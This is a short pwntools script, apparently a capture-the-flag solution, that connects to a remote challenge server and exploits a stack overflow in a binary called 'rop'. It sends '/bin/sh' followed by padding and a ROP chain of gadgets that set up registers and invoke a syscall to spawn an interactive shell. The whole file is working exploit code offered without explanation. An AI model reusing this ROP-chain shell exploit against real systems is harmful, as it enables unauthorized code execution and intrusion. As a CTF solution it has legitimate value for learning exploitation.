from pwn import *
from pwn import p32
elf=ELF('./rop')

# p=elf.process()

p=remote('ctf.hackme.quest',7704)

xor_eax=0x080492d3
syscall=0x0806c943

push_eax_pop_ebx=0x080d6093


add_eax_2=0x0808eed7
add_eax_3=0x0808eef0
mov_eax_7=0x0808ef70

offset=16

# gdb.attach(p,gdbscript='b* 0x804888e')

payload=b'/bin/sh\x00'+b'a'*8
payload+=p32(push_eax_pop_ebx)
payload+=p32(xor_eax)
payload+=p32(mov_eax_7)
payload+=p32(add_eax_2)+p32(add_eax_2)+p32(syscall)

# p.send(b'/bin/sh\x00')

p.sendline(payload)
p.interactive()

